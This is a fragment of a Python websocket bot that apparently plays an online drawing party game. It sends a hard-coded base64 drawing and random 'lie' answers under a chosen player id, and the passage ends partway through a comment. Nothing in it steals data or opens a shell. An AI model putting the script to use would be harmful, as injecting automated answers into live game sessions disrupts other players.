            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"drawing":"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3mRmpXlnXp4efSa+U+E6o2cJ8BmUj5vj3Q+95vmQmT31ci9aAlhep93fOeX6y99m9sbIK6nOpdyNw2aadDeI3Z1Vek94W0jQZy20GmoB2wDrjpYuv9TR2iucdU9omFZTTpDEFBCAgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASuC/PAbfS2O+2XQAAAAASUVORK5CYII="}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"lieEntered":"'+str(random.choice(answers))+'","usedSuggestion":false}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"lieEntered":"'+str(random.choice(answers))+'","usedSuggestion":true}}}')
            try: #
                ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"id":"'+str(json.loads(message)['params']['body']['id'])+'","drawing":"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3mRmpXlnXp4efSa+U+E6o2cJ8BmUj5vj3Q+95vmQmT31ci9aAlhep93fOeX6y99m9sbIK6nOpdyNw2aadDeI3Z1Vek94W0jQZy20GmoB2wDrjpYuv9TR2iucdU9omFZTTpDEFBCAgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASoAAq6Sog0BAAgQ4oClIgoBKgACrpKiDQEACBDigKUiCgEqAAKukqINAQAIEOKApSIKASuC/PAbfS2O+2XQAAAAASUVORK5CYII="}}}')
            except Exception as e: print(e)
            add_log(f'Maked an answer (picture) {sessionnick} {fromm}')
        choiced = False
            #{"seq":1,"opcode":"client/send","params":{"from":4,"to":1,"body":{"id":"23838_4","drawing":"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